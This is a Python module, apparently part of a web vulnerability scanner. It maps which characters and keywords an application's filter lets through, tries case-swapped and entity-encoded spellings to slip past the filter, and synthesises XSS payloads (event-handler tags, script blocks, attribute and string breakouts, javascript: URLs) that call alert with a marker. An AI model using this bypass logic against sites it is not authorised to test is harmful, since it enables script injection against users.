"""Character-level filter brute force and payload synthesis.

The ordinary filter profile sends one probe containing every interesting
character and reads what came back. That is cheap, but it has a blind spot: a
filter that rejects the *whole* value because of one character tells you
nothing about the other characters, and a filter that strips `(` can make an
otherwise perfect payload fail.

This module asks the question one character at a time — marker + char + marker,
so a surviving character is visible even when its neighbours would have been
rejected — and then *synthesises* payloads that use only what survived. The
result is not a bypass generator with a fixed script: it is a small constraint
solver over the characters the application actually allows.

Cost is bounded (``max_requests``) and the caller decides when it is worth
spending: it runs only after a reflection was found and the normal ladder
failed, which is exactly the point where extra requests buy information.
"""
from __future__ import annotations

from dataclasses import dataclass, field

from . import contexts

# The characters that matter for building a working HTML/JS payload. Order is
# by usefulness so a truncated run still answers the important questions.
PROBE_CHARS = "<>\"'`()/ =;&#\t\\{}[]$:.+-_"

# How frameworks and sanitisers spell a character when they encode rather than
# strip it. Presence of any form means the character survives as data.
ENCODED_FORMS = {
    "<": ("&lt;", "&#60;", "&#x3c;"),
    ">": ("&gt;", "&#62;", "&#x3e;"),
    '"': ("&quot;", "&#34;", "&#x22;"),
    "'": ("&#39;", "&#x27;", "&apos;"),
    "&": ("&amp;", "&#38;", "&#x26;"),
    "(": ("&#40;", "&#x28;"),
    ")": ("&#41;", "&#x29;"),
    "/": ("&#47;", "&#x2f;"),
    "=": ("&#61;", "&#x3d;"),
    "`": ("&#96;", "&#x60;"),
    "\\": ("&#92;", "&#x5c;"),
}

# Sinks that fire without user interaction, in order of how often they are
# allowed through a sanitiser.
EVENTS = ("onload", "onerror", "onfocus", "onpointerover", "ontoggle",
          "onanimationstart", "onbegin")

FUNCTIONS = ("alert", "confirm", "prompt", "print")

# Keyword probes, ordered by how much a synthesised payload needs them: the
# function call and the event handler come first, because a vector without
# either cannot fire.  Only the low-``""``-frequency words are probed last.
PROBE_WORDS = ("alert", "onload", "onerror", "onfocus", "svg", "confirm",
               "ontoggle", "onanimationstart", "onpointerover", "prompt",
               "script", "onbegin", "print")

# Contexts where a synthesised payload can actually run live in contexts.py;
# this alias exists so callers and tests keep one import. A reflection in JSON,
# plain text, a header or a CSS value is not executable, and reporting it as
# XSS would be a false positive, so the stage refuses those.
EXECUTABLE_CONTEXTS = contexts.EXECUTABLE_CONTEXTS
RAWTEXT_CONTEXTS = contexts.RAWTEXT_CONTEXTS

# Substrings whose ban changes what a payload can look like. A filter that blocks
# "<script" but allows "<svg" is a different problem from one that blocks "<".
PROBE_PAIRS = ("<script", "</script", "<svg", "onerror=", "onload=",
               "javascript:", "<>", '"><', "=(", "(){}")


@dataclass
class CharMap:
    """What happened to each probed character: raw, encoded, stripped, unknown."""

    chars: dict[str, str] = field(default_factory=dict)
    requests: int = 0
    marker_ok: bool = True

    def state(self, ch: str) -> str:
        return self.chars.get(ch, "unknown")

    def raw(self, ch: str) -> bool:
        return self.state(ch) == "raw"

    def encoded(self, ch: str) -> bool:
        return self.state(ch) == "encoded"

    def present(self, ch: str) -> bool:
        return self.state(ch) in ("raw", "encoded")

    def allows(self, *chars: str) -> bool:
        """True only when every character is known to survive unencoded."""
        return all(self.raw(ch) for ch in chars)

    def any_form(self, *chars: str) -> bool:
        return all(self.present(ch) for ch in chars)

    @property
    def stripped(self) -> list[str]:
        return [ch for ch, state in self.chars.items() if state == "stripped"]

    @property
    def known(self) -> bool:
        return any(state != "unknown" for state in self.chars.values())

    def describe(self) -> str:
        if not self.known:
            return "filter brute force: no characters probed"
        raw = "".join(ch for ch in self.chars if self.chars[ch] == "raw")
        gone = "".join(self.stripped)
        bits = [f"filter brute force: {self.requests} probe(s)"]
        if raw:
            bits.append(f"survive raw: {raw!r}")
        if gone:
            bits.append(f"stripped: {gone!r}")
        encoded = "".join(ch for ch in self.chars if self.chars[ch] == "encoded")
        if encoded:
            bits.append(f"entity-encoded: {encoded!r}")
        return "; ".join(bits)

    def as_dict(self) -> dict:
        return {"chars": dict(self.chars), "requests": self.requests,
                "marker_reflected": self.marker_ok}


@dataclass
class Synthetic:
    """A payload built from characters the target is known to keep."""

    name: str
    template: str
    js: str = ""

    def render(self, marker: str, js: str | None = None) -> str:
        """Render for sending, or with the verifier's JS when ``js`` is given."""
        body = self.js if js is None else js
        return self.template.replace("{JS}", body.replace("{M}", marker))

    def as_dict(self) -> dict:
        return {"name": self.name, "template": self.template, "js": self.js}


def map_chars(send, marker: str, chars: str | None = None,
              max_requests: int = 24, log=None) -> CharMap:
    """Probe each character individually: ``marker + char + marker``.

    ``send(value)`` returns a Response-like object with ``text``. The first
    probe is the bare marker, so a point that does not reflect at all exits
    after one request instead of twenty-four.
    """
    out = CharMap()
    chars = chars or PROBE_CHARS
    try:
        head = send(marker)
    except Exception:
        return out
    out.requests += 1
    body = getattr(head, "text", "") or ""
    if marker not in body:
        out.marker_ok = False
        return out
    for ch in chars:
        if out.requests >= max_requests:
            break
        probe = f"{marker}{ch}{marker}"
        try:
            resp = send(probe)
        except Exception:
            continue
        out.requests += 1
        text = getattr(resp, "text", "") or ""
        if probe in text:
            out.chars[ch] = "raw"
        elif any(f"{marker}{form}{marker}" in text
                 for form in ENCODED_FORMS.get(ch, ())):
            out.chars[ch] = "encoded"
        elif marker in text:
            out.chars[ch] = "stripped"
        else:
            # The whole value vanished for this probe: the character is not the
            # problem, the point stopped reflecting. Leave it unknown.
            out.chars[ch] = "unknown"
    if log and out.known:
        log.debug(f"    {out.describe()}")
    return out


def _case_forms(word: str) -> tuple[str, ...]:
    """Spellings to try for a keyword, cheapest first.

    A filter that blocks ``onerror`` usually matches case-sensitively, while the
    HTML parser and the JS engine do not care about case at all. Probing only the
    lowercase spelling therefore reports "keyword blocked" for filters that a
    one-character case change walks straight past.
    """
    forms = [word]
    swapped = "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(word))
    if swapped != word:
        forms.append(swapped)
    upper = word.upper()
    if upper not in forms:
        forms.append(upper)
    return tuple(forms)


def keyword_forms(send, marker: str,
                  words: tuple[str, ...] = PROBE_WORDS,
                  max_requests: int = 8, log=None) -> dict[str, str]:
    """Map each keyword to a spelling that survives, or ``""`` if none does.

    Returns the *working form* rather than a boolean so the synthesizer can emit
    ``OnErRoR`` when that is what the filter allows, instead of silently giving up
    on a keyword that is only blocked in one casing.
    """
    forms: dict[str, str] = {}
    spent = 0
    for word in words:
        for form in _case_forms(word):
            if spent >= max_requests:
                return forms
            probe = f"{marker}{form}{marker}"
            try:
                resp = send(probe)
            except Exception:
                continue
            spent += 1
            text = getattr(resp, "text", "") or ""
            if marker not in text:
                continue          # point stopped reflecting: unknown, not blocked
            if form in text:
                forms[word] = form
                break
            forms.setdefault(word, "")
    if log:
        blocked = [w for w, form in forms.items() if not form]
        recased = [f"{w}->{form}" for w, form in forms.items() if form and form != w]
        if recased:
            log.debug(f"    keyword casing needed: {', '.join(recased)}")
        if blocked:
            log.debug(f"    keywords blocked in every casing: {', '.join(blocked)}")
    return forms


def map_keywords(send, marker: str, words: tuple[str, ...] = PROBE_WORDS,
                 max_requests: int = 8, log=None) -> dict[str, bool]:
    """Boolean view of :func:`keyword_forms` (True = usable in some casing)."""
    forms = keyword_forms(send, marker, words, max_requests, log)
    return {word: bool(form) for word, form in forms.items()}


def map_pairs(send, marker: str, pairs: tuple[str, ...] = PROBE_PAIRS,
              max_requests: int = 10, log=None) -> dict[str, bool]:
    """Probe multi-character sequences, which single characters cannot reveal.

    ``<`` surviving on its own says nothing about ``<script`` being blocked as a
    token, and that difference decides whether a payload should use ``<svg`` or a
    script block. True means the sequence came back verbatim.
    """
    out: dict[str, bool] = {}
    spent = 0
    for pair in pairs:
        if spent >= max_requests:
            break
        probe = f"{marker}{pair}{marker}"
        try:
            resp = send(probe)
        except Exception:
            continue
        spent += 1
        text = getattr(resp, "text", "") or ""
        if marker not in text:
            continue
        out[pair] = probe in text
    if log:
        banned = [p for p, ok in out.items() if not ok]
        if banned:
            log.debug(f"    blocked sequences: {', '.join(banned)}")
    return out


def detect_truncation(send, marker: str, max_requests: int = 7,
                      log=None) -> int:
    """Find the length at which the target starts cutting the value.

    Returns the number of characters that survive (0 = no truncation seen). Many
    real filters cut at a fixed buffer size; a payload silently cut in half looks
    exactly like a payload whose characters were stripped, and the two need
    completely different next steps.
    """
    def survives(length: int) -> bool | None:
        filler = "A" * length
        probe = f"{marker}{filler}{marker}"
        try:
            resp = send(probe)
        except Exception:
            return None
        text = getattr(resp, "text", "") or ""
        if marker not in text:
            return None
        return probe in text

    spent = 0
    lo, hi = 8, 2048
    first_ok = survives(lo)
    spent += 1
    if first_ok is None or not first_ok:
        return 0
    last_ok = lo
    if spent < max_requests:
        top = survives(hi)
        spent += 1
        if top:
            return 0                      # 2 KB goes through: not truncating
    while spent < max_requests and hi - lo > 8:
        mid = (lo + hi) // 2
        verdict = survives(mid)
        spent += 1
        if verdict is None:
            break
        if verdict:
            lo = mid
            last_ok = max(last_ok, mid)
        else:
            hi = mid
    cut = 0 if last_ok >= hi - 8 and hi >= 2048 else last_ok
    if log and cut:
        log.debug(f"    value truncated near {cut} characters")
    return int(cut)


def _pick_quote(chars: CharMap) -> str:
    for quote in ('"', "'", "`"):
        if chars.raw(quote):
            return quote
    return ""


def _pick_function(words: dict[str, bool]) -> str:
    """A callable the filter allows in some casing, or "" when none is left.

    Falling back to ``alert`` when every candidate was probed and blocked is how
    a synthesised vector ends up containing the very word the filter drops.
    """
    for name in FUNCTIONS:
        if words.get(name, True):  # not probed counts as allowed
            return name
    return ""


def _pick_event(words: dict[str, bool]) -> str:
    for name in EVENTS:
        if words.get(name, True):
            return name
    return ""


def _form(forms: dict[str, str] | None, name: str) -> str:
    """The spelling of *name* that survived the filter, or "" if none did.

    ``forms`` only holds a key once the word was probed: a missing key means the
    probe budget ran out, so the plain spelling is still worth trying.  A key
    mapped to ``""`` means every casing was blocked and the word is unusable.
    """
    if not forms or not name or name not in forms:
        return name
    return forms[name]


def _invocation(fn: str, marker: str, chars: CharMap) -> str:
    """A call to ``fn`` built only from surviving punctuation."""
    quote = _pick_quote(chars)
    argument = f"{quote}{marker}{quote}" if quote else "1"
    if chars.allows("(", ")"):
        return f"{fn}({argument})"
    if chars.raw("`"):
        # Tagged template: alert`marker` calls the function with an array.
        return f"{fn}`{marker}`"
    if chars.allows("&", "#", ";"):
        # The HTML parser decodes entities inside an attribute value before the
        # JS engine sees it, so entity-encoded parentheses are still a call.
        return f"{fn}&#40;{argument.lstrip('-')}&#41;"
    return ""


def _markup(js: str, chars: CharMap, words: dict[str, bool],
            forms: dict[str, str] | None = None) -> list[tuple[str, str]]:
    """Tag/attribute constructions whose punctuation survives the filter."""
    if not js or not chars.allows("<", ">"):
        return []
    event = _form(forms, _pick_event(words))
    tag = _form(forms, "svg") if words.get("svg", True) else _form(forms, "img")
    handler_ok = bool(event and tag)
    out: list[tuple[str, str]] = []
    if handler_ok and chars.raw("="):
        if chars.raw(" "):
            out.append((f"{tag}-space", f"<{tag} {event}={js}>"))
        if chars.raw("/"):
            out.append((f"{tag}-slash", f"<{tag}/{event}={js}>"))
        if chars.raw("\t"):
            out.append((f"{tag}-tab", f"<{tag}\t{event}={js}>"))
    # A script block needs no event handler, so it survives the case where every
    # handler name was blocked.
    if chars.allows("/", "<", ">"):
        out.append(("script-block", f"<script>{js}</script>"))
    if handler_ok and chars.allows("&", "#", ";") and chars.raw("=") and chars.raw(" "):
        out.append((f"{tag}-entity-eq", f"<{tag} {event}&#61;{js}>"))
    return out


def _quote_for(context: str) -> str:
    return contexts.break_quote(context)


RAWTEXT_CLOSE = contexts.RAWTEXT_CONTEXTS


def _dedupe(items: list[Synthetic]) -> list[Synthetic]:
    out: list[Synthetic] = []
    seen: set[str] = set()
    for item in items:
        key = item.template + "|" + item.js
        if key in seen:
            continue
        seen.add(key)
        out.append(item)
    return out


def _banned_hit(vector: Synthetic, marker: str, banned: tuple[str, ...]) -> bool:
    """True when a vector contains a sequence the target blocks.

    A blocked sequence is worse than a blocked character: no amount of
    reassembly helps if ``onerror=`` itself never survives, so vectors that need
    it are dropped rather than sent and counted as failures.
    """
    if not banned:
        return False
    rendered = vector.template.replace("{JS}", vector.js.replace("{M}", marker))
    return any(seq and seq in rendered for seq in banned)


def synthesise(chars: CharMap, words: dict[str, bool] | None = None,
               marker: str = "xs1",
               context: str = "html_text",
               forms: dict[str, str] | None = None,
               banned: tuple[str, ...] = ()) -> list[Synthetic]:
    """Build payloads from the surviving character set, best first.

    Returns templates with ``{JS}``/``{M}`` slots so the scanner can render
    them with the marker it is already tracking for that point. ``context`` is
    the reflection context: a payload that breaks out of an attribute or a JS
    string needs the matching quote, which a payload aimed at HTML text does
    not. Building for the wrong context is how a filter brute forcer ends up
    with a list of strings the page never executes.
    """
    words = words or {}
    if not chars.known:
        return []
    fn = _form(forms, _pick_function(words))
    if not fn:
        return []                     # every callable was probed and blocked
    js = _invocation(fn, "{M}", chars)
    if not js:
        return []
    # Templates keep a {JS} slot so the browser verifier can swap in its own
    # DOM-probe script; the concrete call travels alongside as ``js``.
    markup = _markup("{JS}", chars, words, forms)

    quote = _quote_for(context)
    if quote and not chars.raw(quote):
        return []

    if context in ("js_string_double", "js_string_single", "js_template"):
        out = [Synthetic("js-breakout", f"{quote};{{JS}}//", js)]
        if context == "js_template" and chars.allows("$", "{", "}"):
            out.append(Synthetic("js-template-inject", "${{" + "{JS}" + "}}", js))
        return [v for v in _dedupe(out) if not _banned_hit(v, marker, banned)]

    if context in ("attr_double", "attr_single"):
        out = []
        # Staying inside the tag needs no angle brackets at all: close the
        # quoted value, add an event handler and let autofocus fire it.
        if chars.allows(" ", "=", quote):
            inner = js
            if quote in inner:
                # The handler lives inside a quoted attribute, so the call's
                # own quotes must be entity-encoded or the tag ends early.
                if chars.allows("&", ";"):
                    inner = inner.replace(
                        quote, "&quot;" if quote == '"' else "&#39;")
                elif chars.allows("(", ")") and quote not in f"{fn}(1)":
                    inner = f"{fn}(1)"
                else:
                    inner = ""
            if inner:
                out.append(Synthetic(
                    "attr-event",
                    f"{quote} onfocus={quote}{{JS}}{quote} autofocus={quote}{quote}",
                    inner))
        if chars.raw(">"):
            out.extend(Synthetic(name, f"{quote}>{template}", js)
                       for name, template in markup)
        return [v for v in _dedupe(out) if not _banned_hit(v, marker, banned)]

    if context == "url_attr":
        out = []
        if (chars.raw(":") and words.get("javascript", True)
                and (chars.allows("(", ")") or chars.raw("`"))):
            url_js = _invocation(fn, "{M}", chars)
            if url_js:
                out.append(Synthetic("javascript-url", "javascript:{JS}", url_js))
        for boundary in ('"', "'"):
            if chars.raw(boundary) and chars.raw(">"):
                out.extend(Synthetic(name, f"{boundary}>{template}", js)
                           for name, template in markup)
        return [v for v in _dedupe(out) if not _banned_hit(v, marker, banned)]

    if context == "comment":
        return [v for v in _dedupe([Synthetic(name, ">" + template, js)
                                    for name, template in markup])
                if not _banned_hit(v, marker, banned)]

    if context in RAWTEXT_CLOSE:
        if not chars.allows("<", ">", "/"):
            return []
        close = f"</{context}>"
        return [v for v in _dedupe([Synthetic(name, close + template, js)
                                    for name, template in markup])
                if not _banned_hit(v, marker, banned)]

    out = [Synthetic(name, template, js) for name, template in markup]
    # A URL attribute (`href`, `src`, `formaction`) accepts javascript: even
    # when markup characters are stripped; the caller decides whether the
    # context makes that meaningful because the same payload is harmless text
    # elsewhere.
    if (chars.raw(":") and words.get("javascript", True)
            and (chars.allows("(", ")") or chars.raw("`"))):
        url_js = _invocation(fn, "{M}", chars)
        if url_js:
            out.append(Synthetic("javascript-url", "javascript:{JS}", url_js))
    return [v for v in _dedupe(out) if not _banned_hit(v, marker, banned)]


def summary(chars: CharMap, words: dict[str, bool] | None = None,
            context: str = "html_text", forms: dict[str, str] | None = None,
            blocked: dict[str, bool] | None = None,
            truncation: int = 0) -> dict:
    """Report-friendly view of what the filter allows."""
    words = words or {}
    return {
        "chars": dict(chars.chars),
        "requests": chars.requests,
        "marker_reflected": chars.marker_ok,
        "keywords": dict(words),
        "keyword_forms": dict(forms or {}),
        "blocked_sequences": [seq for seq, ok in (blocked or {}).items() if not ok],
        "truncation": truncation,
        "stripped": chars.stripped,
        "synthesised": [s.as_dict() for s in synthesise(
            chars, words, context=context, forms=forms,
            banned=tuple(seq for seq, ok in (blocked or {}).items() if not ok))],
    }
